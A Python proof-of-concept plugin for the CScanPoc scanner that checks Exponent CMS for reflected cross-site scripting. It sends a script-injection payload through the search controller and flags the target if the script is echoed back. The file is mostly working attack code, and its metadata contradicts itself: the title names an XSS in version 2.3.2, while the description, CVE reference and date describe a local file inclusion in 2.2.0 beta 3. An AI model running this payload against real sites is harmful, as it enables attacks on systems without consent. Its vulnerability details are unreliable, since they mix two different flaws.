# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    vuln_id = 'ExponentCMS_0001' # 平台漏洞编号，留空
    name = 'Exponent CMS 2.3.2 Reflected XSS Vulnerability'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2013-04-26'  # 漏洞公布时间
    desc = '''
        ponent CMS中存在本地文件包含漏洞，该漏洞源于程序没有充分过滤用户提交的输入。
        攻击者可利用该漏洞查看文件和以受影响应用程序的权限执行任意本地PHP代码。CMS 2.2.0 beta 3版本中存在漏洞，其他版本也可能受到影响
    '''  # 漏洞描述
    ref = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-3295'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'CVE-2013-3295'  # cve编号
    product = 'ExponentCMS'  # 漏洞应用名称
    product_version = '2.3.2'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '3a3c14a4-0929-4a01-aec6-886dfbe8badd'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/exponent/index.php?controller=search&src=f324e%22><script>alert(1)</script>9cbae6bf552&action=search&search_string=test&int=%0d'
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)

            content = urllib2.urlopen(req).read()
            if '<script>alert(1)</script>' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
